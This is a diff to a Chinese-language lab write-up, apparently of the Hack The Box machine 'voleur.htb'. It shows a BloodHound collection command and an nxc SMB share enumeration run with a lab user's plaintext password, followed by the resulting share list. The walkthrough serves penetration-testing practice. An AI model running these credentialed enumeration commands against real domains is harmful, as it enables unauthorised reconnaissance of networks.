@@ -74,3 +74,24 @@ bloodhound收集
 ```shell
 bloodhound-python -u ryan.naylor -p HollowOct31Nyt -k -ns 10.10.11.76 -c All -d voleur.htb --zip
 ```
+![](attachments/Pasted%20image%2020250913144218.png)
+
+smb 枚举
+
+```SHELL
+$ nxc smb dc.voleur.htb -u ryan.naylor -p 'HollowOct31Nyt' -k --shares --smb-timeout 500
+
+SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)
+SMB         dc.voleur.htb   445    dc               [+] voleur.htb\ryan.naylor:HollowOct31Nyt
+SMB         dc.voleur.htb   445    dc               [*] Enumerated shares
+SMB         dc.voleur.htb   445    dc               Share           Permissions     Remark                                                              
+SMB         dc.voleur.htb   445    dc               -----           -----------     ------                                                              
+SMB         dc.voleur.htb   445    dc               ADMIN$                          Remote Admin                                                        
+SMB         dc.voleur.htb   445    dc               C$                              Default share                                                       
+SMB         dc.voleur.htb   445    dc               Finance                 
+SMB         dc.voleur.htb   445    dc               HR                      
+SMB         dc.voleur.htb   445    dc               IPC$            READ            Remote IPC                                                          
+SMB         dc.voleur.htb   445    dc               IT              READ    
+SMB         dc.voleur.htb   445    dc               NETLOGON        READ            Logon server share                                                  
+SMB         dc.voleur.htb   445    dc               SYSVOL          READ            Logon server share
+```
